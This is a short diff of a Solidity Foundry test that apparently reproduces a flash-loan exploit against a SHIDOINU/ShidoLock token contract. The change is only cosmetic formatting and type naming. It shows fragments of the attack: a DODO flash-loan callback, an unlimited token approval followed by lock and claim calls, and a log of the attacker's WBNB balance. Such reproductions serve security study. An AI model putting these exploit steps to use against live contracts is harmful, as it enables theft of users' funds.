@@ -61,7 +61,7 @@ contract ContractTest is Test {
 
         emit log_named_decimal_uint(
             "Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), WBNB.decimals()
-        );
+            );
     }
 
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
@@ -89,7 +89,7 @@ contract ContractTest is Test {
     }
 
     function LockAndClaimToken() internal {
-        SHIDOINU.approve(address(ShidoLock), type(uint).max);
+        SHIDOINU.approve(address(ShidoLock), type(uint256).max);
         ShidoLock.lockTokens();
         ShidoLock.claimTokens();
     }
